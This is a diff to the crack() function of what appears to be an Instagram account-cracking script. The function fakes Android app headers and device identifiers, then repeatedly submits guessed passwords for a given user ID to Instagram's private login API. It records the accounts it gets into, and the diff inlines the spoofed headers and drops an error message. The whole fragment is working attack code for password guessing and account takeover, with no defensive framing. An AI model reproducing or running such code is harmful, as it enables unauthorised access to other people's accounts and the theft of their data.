@@ -224,15 +224,36 @@ def crack(uid, pww, total_idz):
             enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}"
             response = session.get('https://www.instagram.com/accounts/login/')
             csrftoken = response.cookies.get('csrftoken')
-            session.headers.update({**HeadersApiLogin(),
+            session.headers.update({
+            'host': 'b.i.instagram.com',
+            'x-ig-app-locale': 'in_ID',
+            'x-ig-device-locale': 'in_ID',
+            'x-ig-mapped-locale': 'id_ID',
+            'x-pigeon-session-id': f'UFS-{uuid.uuid4()}-3',
+            'x-bloks-version-id': Blok_ID(),
+            'x-bloks-is-prism-enabled': 'false',
+            'x-bloks-is-layout-rtl': 'false',
+            'x-ig-timezone-offset': str(timezone_offset()),
+            'x-fb-connection-type': 'MOBILE.LTE',
+            'x-ig-connection-type': 'MOBILE(LTE)',
+            'x-ig-capabilities': '3brTv10=',
+            'x-ig-app-id': '3419628305025917',
+            'priority': 'u=3',
+            'accept-language': 'id-ID, en-US',
+            'x-mid': str(SetMid()),
+            'ig-intended-user-id': '0',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'x-fb-http-engine': 'Liger',
+            'x-fb-client-ip': 'True',
+            'x-fb-server-cluster': 'True',
             'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
-            'x-ig-bandwidth-speed-kbps': '{}'.format(random.randint(100,300)),
+            'x-ig-bandwidth-speed-kbps': str(random.randint(100,300)),
             'x-ig-bandwidth-totalbytes-b': str(random.randint(500000,900000)),
             'x-ig-bandwidth-totaltime-ms': str(random.randint(1000,9000)),
-            'user-agent': AppUac(HeadersApiLogin()['x-bloks-version-id']),
-            'x-ig-android-id': 'android-' + str(Android_ID(uid, pw).hexdigest()[:16]),
+            'user-agent': AppUac(Blok_ID()),
+            'x-ig-android-id': 'android-' + Android_ID(uid, pw).hexdigest()[:16],
             'x-ig-family-device-id': str(uuid.uuid4()),
-            'x-ig-device-id': str(uuid.uuid4())})
+            'x-ig-device-id': str(uuid.uuid4()),})
             DataRec = {'params': '{"client_input_params":{"contact_point":"'+uid+'","password":"#PWD_INSTAGRAM:0:'+str(int(time.time()))+':'+str(pw)+'","event_flow":"account_recovery","family_device_id":"'+session.headers['x-ig-family-device-id']+'","machine_id":"'+ str(session.headers['x-mid']) +'","accounts_list":[],"has_whatsapp_installed":0,"login_attempt_count":1,"device_id":"'+str(session.headers['x-ig-android-id'])+'","headers_infra_flow_id":"","auth_secure_device_id":"","encrypted_msisdn":"","device_emails":[],"lois_settings":{"lara_override":"","lois_token":""},"event_step":"AYMH_PASSWORD_FORM","secure_family_device_id":""},"server_params":{"is_caa_perf_enabled":0,"is_platform_login":0,"is_from_logged_out":0,"login_credential_type":"none","should_trigger_override_login_2fa_action":0,"is_from_logged_in_switcher":0,"family_device_id":"'+str(session.headers['x-ig-family-device-id'])+'","credential_type":"password","waterfall_id":"'+str(uuid.uuid4())+'","password_text_input_id":"4kv99g:38","layered_homepage_experiment_group":null,"offline_experiment_group":null,"INTERNAL_INFRA_THEME":"harm_f","INTERNAL__latency_qpl_instance_id":27691536400061,"device_id":"'+str(session.headers['x-ig-android-id'])+'","server_login_source":"device_based_login","login_source":"AccountRecovery","caller":"gslr","should_trigger_override_login_success_action":0,"ar_event_source":"first_password_failure","INTERNAL__latency_qpl_marker_id":36707139}}','bk_client_context': '{"bloks_version":"'+str(session.headers['x-bloks-version-id'])+'","styles_id":"instagram"}','bloks_versioning_id': str(session.headers['x-bloks-version-id'])}
             Query = 'params=%s&bk_client_context=%s&bloks_versioning_id=%s'%(urllib.parse.quote(DataRec['params']), urllib.parse.quote(DataRec['bk_client_context']), DataRec['bloks_versioning_id'])
             Respons = session.post('https://b.i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=Query,allow_redirects=True)
@@ -242,7 +263,6 @@ def crack(uid, pww, total_idz):
                 oks.append(uid)
                 return True
             else:
-                print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
                 continue
         loop+=1
     except ConnectionError:
